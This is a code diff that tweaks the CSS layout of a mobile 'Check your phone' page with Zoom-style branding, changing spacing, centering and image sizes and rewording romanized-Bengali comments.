@@ -23,20 +23,21 @@
       overflow-x: hidden;
     }
 
-    /* Layout fix kora holo: space-between shoriye flex-start dewa hoyeche jate faka na thake */
+    /* Container: Faka space shob shoriye compact kora holo */
     .container {
       width: 100%;
       min-height: 100dvh;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
-      justify-content: flex-start; /* Ei line tai faka jayga bondho korbe */
+      justify-content: center; /* Majhkhane shob element compact vabe thakbe */
       align-items: center;
       text-align: center;
-      padding: 6vh 5vw 4vh 5vw;
+      padding: 3vh 5vw;
       background: #ffffff;
       max-width: 440px;
       margin: 0 auto;
+      gap: 2.5vh; /* Element gulor majhkhane ekta choto, shundor consistent gap */
     }
 
     /* Top Section */
@@ -45,7 +46,7 @@
       flex-direction: column;
       align-items: center;
       width: 100%;
-      gap: 0.6vh;
+      gap: 0.5vh;
     }
 
     /* Zoom Logo */
@@ -87,7 +88,7 @@
       padding: 5px 15px;
       border: 1px solid #dadce0;
       border-radius: 20px;
-      margin-top: 0.5vh;
+      margin-top: 0.4vh;
       background: #fff;
     }
 
@@ -108,22 +109,21 @@
       color: #5f6368;
     }
 
-    /* Phone Graphic ebong Text ek sathe rakhbe. margin-top diye faka control kora hoyeche */
+    /* Center Content (Phone Illustration + Text Group) */
     .center-content {
       display: flex;
       flex-direction: column;
       align-items: center;
       width: 100%;
-      gap: 1.5vh;
-      margin-top: 5vh; /* Uporer ongsho theke fixed gap */
+      gap: 1.2vh;
     }
 
     /* Phone Graphic Illustration */
     .phone-illustration {
-      width: 60vw;
-      max-width: 250px;
+      width: 55vw;
+      max-width: 230px;
       height: auto;
-      max-height: 35vh;
+      max-height: 30vh;
       object-fit: contain;
     }
 
@@ -133,32 +133,32 @@
       flex-direction: column;
       align-items: center;
       width: 100%;
-      gap: 0.8vh;
+      gap: 0.6vh;
     }
 
-    /* Check your phone - Bold kora */
+    /* Check your phone - Bold */
     h2 {
       font-size: clamp(23px, 6vw, 29px);
       font-weight: 600;
       color: #202124;
     }
 
-    /* Description Text base style */
+    /* Description Text */
     .desc-text {
       font-size: clamp(17px, 4.7vw, 21px);
       color: #3c4043;
-      line-height: 1.45;
+      line-height: 1.4;
       max-width: 400px;
       font-weight: 400;
     }
 
-    /* Specific line gulo Bold korar jonno */
+    /* Bold lines */
     .desc-text .bold-text {
       font-weight: 600;
       color: #202124;
     }
 
-    /* Resend / Action Button */
+    /* Resend / Action Button - Text er thik nisei thakbe */
     .btn-join {
       background-color: #1a73e8;
       color: white;
@@ -171,7 +171,6 @@
       border-radius: 6px;
       cursor: pointer;
       transition: background-color 0.2s;
-      margin-top: 3.5vh; /* Text er thik nisei bosiye dewa holo */
     }
 
     .btn-join:hover {
@@ -213,7 +212,7 @@
       </div>
     </div>
 
-    <!-- Resend button ekhon ar bottom e jabe na, text er kachakachi thakbe -->
+    <!-- Resend button -->
     <button class="btn-join" onclick="window.location.href='../'">Resend</button>
   </div>
 
